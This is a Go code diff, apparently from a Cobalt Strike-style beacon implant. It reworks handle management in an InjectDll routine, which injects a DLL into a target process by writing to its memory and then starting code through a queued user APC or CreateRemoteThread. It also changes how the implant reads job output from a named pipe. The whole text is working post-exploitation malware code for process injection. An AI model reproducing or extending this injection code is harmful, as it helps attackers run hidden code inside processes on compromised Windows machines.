@@ -54,21 +54,16 @@ var jobCnt = 0
 var currentPid uint32 = 0
 var currentHandle windows.Handle
 
-// however, some cmd like shinject and dllinject will simply inject process, but doesn't send job handler
-// in that case, I need to close the handle when new handle comes.
-// really hideous code...
+// however, some cmd like shinject and dllinject will simply inject process, but doesn't send job handler.
+// so I should close handle in InjectDll, above cmd shouldn't change global currentHandle
 func updateCurrentHandle(newPid uint32, newHandle windows.Handle) {
 	currentPid = newPid
-	if currentHandle != windows.InvalidHandle {
-		_ = windows.CloseHandle(currentHandle)
-	}
 	currentHandle = newHandle
 }
 
 // implement of beacon.Job
 func InjectDll(b []byte, isDllX64 bool) error {
-	// but shinject and dllinject would not send a job handler cmd
-	updateCurrentHandle(0, windows.InvalidHandle)
+	// don't care about result echo, close handle here
 	pid, offset, dll, _ := parseInject(b)
 	var isProcessX64 = true
 	if sysinfo.GetProcessArch(pid) != sysinfo.ProcessArch64 {
@@ -79,11 +74,12 @@ func InjectDll(b []byte, isDllX64 bool) error {
 	}
 	currentProcessId := windows.GetCurrentProcessId()
 	if pid == currentProcessId {
+		// thread handle
 		hThread, err := injectSelf(dll, offset, nil)
 		if err != nil {
 			return err
 		}
-		updateCurrentHandle(pid, windows.Handle(hThread))
+		_ = windows.CloseHandle(windows.Handle(hThread))
 	} else {
 		processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
 		if err != nil {
@@ -101,19 +97,19 @@ func InjectDll(b []byte, isDllX64 bool) error {
 				continue
 			}
 			err = callUserAPC(processHandle, threadHandle, offset, dll)
-			if err != nil {
-				_ = windows.CloseHandle(threadHandle)
-				continue
+			_ = windows.CloseHandle(threadHandle)
+			// CallUserAPC success
+			if err == nil {
+				break
 			}
-			updateCurrentHandle(pid, threadHandle)
 		}
 		// CallUserAPC fail
 		if err != nil {
-			threadHandle, err := createRemoteThread(processHandle, offset, dll, nil)
+			hThread, err := createRemoteThread(processHandle, offset, dll, nil)
 			if err != nil {
 				return err
 			}
-			updateCurrentHandle(pid, windows.Handle(threadHandle))
+			_ = windows.CloseHandle(windows.Handle(hThread))
 		}
 	}
 	return nil
@@ -434,13 +430,24 @@ func readNamedPipe(j job) error {
 	pipe, err := windows.CreateFile(pipeNamePtr, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
 	defer windows.CloseHandle(pipe)
 	if err != nil {
-		if err == windows.ERROR_PIPE_BUSY {
+		if err == windows.ERROR_FILE_NOT_FOUND {
+			event, err := windows.WaitForSingleObject(j.handle, uint32(j.sleepTime))
+			util.Println(event)
+			if err != nil {
+				return err
+			}
+			pipe, err = windows.CreateFile(pipeNamePtr, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
+			if err != nil {
+				return err
+			}
+		} else if err == windows.ERROR_PIPE_BUSY {
 			_, _, err = waitNamedPipe.Call(uintptr(unsafe.Pointer(pipeNamePtr)), uintptr(j.sleepTime))
 			if err != nil {
 				return err
 			}
+		} else {
+			return err
 		}
-		return err
 	}
 	return loopRead(j.handle, pipe, int(j.sleepTime), j.callback, j.stopCh)
 	//pipe, err := winio.DialPipe(j.pipeName, nil)
